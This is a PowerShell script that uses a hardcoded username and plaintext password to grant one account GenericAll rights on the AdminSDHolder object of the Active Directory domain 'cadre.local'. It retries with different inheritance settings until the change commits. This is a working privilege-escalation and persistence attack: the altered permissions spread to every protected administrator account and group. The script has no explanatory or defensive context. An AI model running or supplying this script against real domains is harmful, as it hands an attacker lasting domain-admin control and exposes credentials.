$ErrorActionPreference = 'Stop'
$user = 'cadre.local\analyst_cloud'
$pass = 'Cl0ud_An@lyst!'
$asd = 'LDAP://CN=AdminSDHolder,CN=System,DC=cadre,DC=local'

$de = New-Object DirectoryServices.DirectoryEntry($asd, $user, $pass)
$sd = $de.ObjectSecurity
$sid = (New-Object Security.Principal.NTAccount('cadre.local\analyst_cloud')).Translate([Security.Principal.SecurityIdentifier])

Write-Output ("DACL_COUNT " + $sd.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier]).Count)

# Try each inheritance enum value to find one that commits
foreach ($inh in @('All', 'None', 'ContainerInherit', 'ObjectInherit')) {
    try {
        $de2 = New-Object DirectoryServices.DirectoryEntry($asd, $user, $pass)
        $sd2 = $de2.ObjectSecurity
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
            [System.Security.AccessControl.AccessControlType]::Allow,
            [Guid]::Empty,
            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::$inh)
        $sd2.AddAccessRule($rule)
        $de2.CommitChanges()
        Write-Output ("COMMIT_OK inh=$inh")
        break
    } catch {
        Write-Output ("COMMIT_FAIL inh=$inh err=" + $_.Exception.Message)
    }
}
